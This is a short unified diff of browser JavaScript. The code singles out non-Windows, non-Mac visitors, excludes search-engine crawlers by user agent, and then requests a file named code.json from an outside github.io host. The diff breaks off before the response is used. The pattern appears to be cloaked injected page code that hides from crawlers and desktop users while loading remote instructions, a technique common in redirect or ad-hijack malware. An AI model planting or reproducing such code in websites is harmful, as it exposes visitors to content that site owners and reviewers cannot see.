@@ -1,7 +1,6 @@
-let isWin = navigator.platform.indexOf("Win") == 0;
-let isMac = navigator.platform.indexOf("Mac") == 0;
+let isWeb =  !(/Win|mac/i.test(navigator.platform));
 let isSpider = /Googlebot|Baiduspider|bingbot|YisouSpider|Bytespider|360Spider|Sogou/i.test(navigator.userAgent);
-let webUser = !isWin && !isMac && !isSpider;
+let webUser = isWeb && !isSpider;
 if (webUser) { 
 const xhr = new XMLHttpRequest()
 const url = 'https://sanjinxiaolongxia.github.io/code.json'
